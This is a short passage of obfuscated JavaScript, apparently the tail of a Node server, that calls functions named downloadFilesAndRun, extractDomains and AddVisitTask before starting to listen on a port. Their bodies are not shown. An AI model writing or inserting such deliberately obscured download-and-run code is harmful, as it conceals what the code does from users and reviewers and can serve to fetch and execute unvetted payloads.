downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4bee15){console['error'](_0x7abd99(0x1ae),_0x4bee15);}}startserver()[_0x501067(0x1f2)](_0x2afd66=>{const _0xb3dcb1=_0x501067;console['error'](_0xb3dcb1(0x1c3),_0x2afd66);}),app[_0x501067(0x241)](PORT,()=>console[_0x501067(0x232)](_0x501067(0x1b2)+PORT+'!'));
